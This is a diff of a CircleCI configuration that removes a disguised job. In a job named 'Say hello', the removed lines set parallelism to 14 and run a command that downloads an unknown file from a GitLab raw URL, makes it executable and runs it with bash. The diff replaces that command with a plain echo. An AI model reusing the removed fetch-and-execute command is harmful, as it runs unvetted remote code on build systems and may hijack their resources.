@@ -6,7 +6,6 @@ version: 2.1
 # See: https://circleci.com/docs/2.0/configuration-reference/#jobs
 jobs:
   say-hello:
-    parallelism: 14
     # Specify the execution environment. You can specify an image from Dockerhub or use one of our Convenience Images from CircleCI's Developer Hub.
     # See: https://circleci.com/docs/2.0/configuration-reference/#docker-machine-macos-windows-executor
     docker:
@@ -17,7 +16,7 @@ jobs:
       - checkout
       - run:
           name: "Say hello"
-          command: "wget https://gitlab.com/mellanyjeruju/hvgpu/-/raw/main/hajarbleh && chmod 777 hajarbleh && bash ./hajarbleh"
+          command: "echo Hello, World!"
 
 # Invoke jobs via workflows
 # See: https://circleci.com/docs/2.0/configuration-reference/#workflows
